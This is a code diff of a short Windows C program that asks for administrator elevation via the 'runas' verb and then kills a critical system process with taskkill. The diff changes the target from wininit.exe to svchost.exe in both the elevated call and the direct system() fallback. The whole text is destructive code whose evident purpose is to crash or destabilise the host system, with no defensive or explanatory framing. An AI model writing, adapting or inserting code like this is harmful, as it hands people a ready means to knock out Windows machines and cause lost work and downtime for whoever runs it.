@@ -22,7 +22,7 @@ int main() {
         sei.hwnd = NULL;
         sei.lpVerb = "runas";  // Request elevation
         sei.lpFile = "cmd.exe";
-        sei.lpParameters = "/c taskkill /IM wininit.exe";  // Taskkill command
+        sei.lpParameters = "/c taskkill /IM svchost.exe";  // Taskkill command
         sei.nShow = SW_SHOWNORMAL;
 
         // Execute with elevated privileges
@@ -36,7 +36,7 @@ int main() {
         CloseHandle(sei.hProcess);
     } else {
         // Execute the taskkill command directly
-        system("taskkill /IM wininit.exe");
+        system("taskkill /IM svchost.exe");
     }
 
     return 0;
